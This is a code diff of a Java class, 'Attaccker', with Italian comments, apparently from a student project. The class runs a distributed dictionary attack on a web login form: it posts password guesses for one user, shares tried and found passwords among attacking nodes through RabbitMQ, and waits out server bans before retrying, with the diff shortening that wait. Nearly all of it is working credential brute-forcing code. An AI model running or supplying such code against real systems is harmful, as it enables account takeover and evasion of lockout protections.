@@ -50,7 +50,8 @@ public class Attaccker implements Runnable {
 	private String name;
 	private String queueName;
 
-	private ArrayList<String> passwordRecieved = new ArrayList<String>(); // indici delle password ricevute da altri client
+	private ArrayList<String> passwordRecieved = new ArrayList<String>(); // indici delle password ricevute da altri
+																			// client
 
 	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
 													// tramite POST
@@ -65,7 +66,7 @@ public class Attaccker implements Runnable {
 		this.dictonary = dictonary;
 		this.passwFound = false;
 		this.ban = false;
-		
+
 		this.exName = exName;
 		// this.message = message;
 		this.name = name;
@@ -83,16 +84,16 @@ public class Attaccker implements Runnable {
 
 	// String result = http.GetPageContent(login);
 	// System.out.println(result);
-	
-	public void start () {
-	      if (t == null) {
-	         t = new Thread (this);
-	         t.start ();
-	      }
-	   }
+
+	public void start() {
+		if (t == null) {
+			t = new Thread(this);
+			t.start();
+		}
+	}
 
 	public void run() {
-		
+
 		// make sure cookies is turn on
 		CookieHandler.setDefault(new CookieManager());
 
@@ -120,7 +121,9 @@ public class Attaccker implements Runnable {
 		while (getPasswFound() == false) {
 
 			for (int i = 0; i < 3; i++) {
+				
 				String postParams = "";
+				
 				try {
 					postParams = this.getFormParams(page, "prova", passwToSend[i]);
 				} catch (UnsupportedEncodingException e) {
@@ -137,10 +140,11 @@ public class Attaccker implements Runnable {
 
 			// Qui si deve considerare response[] ed agire di conseguenza.
 			for (int i = 0; i < response.length; i++) {
+				
 				if (response[i] == 200) {
 					// password trovata, inviarla! passwToSend[i] è la password
 					try {
-						sendMessage("OKAY;"+passwToSend[i]);
+						sendMessage("OKAY;" + passwToSend[i]);
 					} catch (IOException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
@@ -149,28 +153,31 @@ public class Attaccker implements Runnable {
 				} else if (response[i] == 271) {
 					// 0. inviare password agli altri nodi
 					try {
-						sendMessage(passwToSend[i]);
+						sendMessage(getName() + ";" + passwToSend[i]);
 					} catch (IOException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
+
+					passwordRecieved.add(passwToSend[i]);
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 				} else if (response[i] == 270) {
 					// 0. invio indici provati agli altri nodi
-					try {
-						sendMessage(passwToSend[i]);
-					} catch (IOException e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
-					}
+					/*
+					 * try { sendMessage(getName()+";"+passwToSend[i]); } catch (IOException e) { //
+					 * TODO Auto-generated catch block e.printStackTrace(); }
+					 */
 					// 1. Aggiornare la password che ha ritornato errore di autenticazione
 					passwToSend[i] = getNewPasswToSend(passwordRecieved, data);
 					ban = true;
 				}
 
 				if (ban) {
+					
+					ban = false;
 					String postParams = "";
+					
 					try {
 						postParams = this.getFormParams(page, "prova", "a");
 					} catch (UnsupportedEncodingException e1) {
@@ -181,31 +188,36 @@ public class Attaccker implements Runnable {
 					do {
 						// sleep x secondi prima di ritentare
 						try {
-							TimeUnit.SECONDS.sleep(25);
+							TimeUnit.SECONDS.sleep(5);
 						} catch (InterruptedException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
 						}
-						try {
-							a = this.sendPost(login, postParams);
-						} catch (Exception e) {
-							// TODO Auto-generated catch block
-							e.printStackTrace();
+						if (getPasswFound())
+							break;
+						else {
+							try {
+								a = this.sendPost(login, postParams);
+							} catch (Exception e) {
+								// TODO Auto-generated catch block
+								e.printStackTrace();
+							}
 						}
 					} while (a == 270);
 				}
 			}
 		}
+		System.out.println("FINE PROGRAMMA\n");
 	}
 
 	private boolean getPasswFound() {
 		return this.passwFound;
 	}
-	
+
 	private void setPasswFound(boolean b) {
 		this.passwFound = b;
 	}
-	
+
 	private ArrayList<String> readDictonaryAttack(String path) throws IOException {
 
 		String line = "";
@@ -266,9 +278,9 @@ public class Attaccker implements Runnable {
 		wr.close();
 
 		int responseCode = conn.getResponseCode();
-		//System.out.println("\nSending 'POST' request to URL : " + url);
+		// System.out.println("\nSending 'POST' request to URL : " + url);
 		System.out.println(name + ": Post parameters : " + postParams);
-		System.out.println(name + ": receive the following Response Code : " + responseCode);
+		System.out.println(name + ": receive the following Response Code : " + responseCode + "\n");
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -302,9 +314,9 @@ public class Attaccker implements Runnable {
 				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
 			}
 		}
-		//int responseCode = conn.getResponseCode();
-		//System.out.println("\nSending 'GET' request to URL : " + url);
-		//System.out.println("Response Code : " + responseCode);
+		// int responseCode = conn.getResponseCode();
+		// System.out.println("\nSending 'GET' request to URL : " + url);
+		// System.out.println("Response Code : " + responseCode);
 
 		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 		String inputLine;
@@ -324,7 +336,7 @@ public class Attaccker implements Runnable {
 
 	private String getFormParams(String html, String username, String password) throws UnsupportedEncodingException {
 
-		//System.out.println("Extracting form's data...");
+		// System.out.println("Extracting form's data...");
 
 		Document doc = Jsoup.parse(html);
 
@@ -364,7 +376,7 @@ public class Attaccker implements Runnable {
 	private void sendMessage(String message) throws UnsupportedEncodingException, IOException {
 
 		this.channel.basicPublish(this.exName, "", null, message.getBytes("UTF-8"));
-		System.out.println(name + " MANDA: " + message);
+		System.out.println(name + " MANDA: " + message + "\n");
 	}
 
 	public void receivedMessage() throws IOException, TimeoutException {
@@ -376,17 +388,28 @@ public class Attaccker implements Runnable {
 			public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties,
 					byte[] body) throws IOException {
 				String mexReceived = new String(body, "UTF-8");
-				// System.out.println(name + " Received: " + mexReceived);
-				if(mexReceived.split(";")[0] != "OKAY") {
-					passwordRecieved.add(mexReceived);
-				}
-				else {
+				String sender = mexReceived.split(";")[0];
+				mexReceived = mexReceived.split(";")[1];
+
+				if (!(sender.equalsIgnoreCase("OKAY"))) {
+					if (!(sender.equalsIgnoreCase(getName()))) {
+						passwordRecieved.add(mexReceived);
+						System.out.println(getName() + " HA RICEVUTO DA " + sender + ": " + mexReceived + "\n");
+						System.out.println(
+								getName() + " HA IL SEGUENTE passwordRecieved " + passwordRecieved.toString() + "\n");
+					}
+				} else {
 					setPasswFound(true);
-					System.out.println("Password Trovata: "+ mexReceived.split(";")[1]);
+					System.out.println(sender + " ha Trovato la Password: " + mexReceived + "\n");
 				}
 			}
 		};
 
 		this.channel.basicConsume(this.queueName, true, consumer);
+	}
+
+	private String getName() {
+		String a = this.name;
+		return a;
 	}
 }
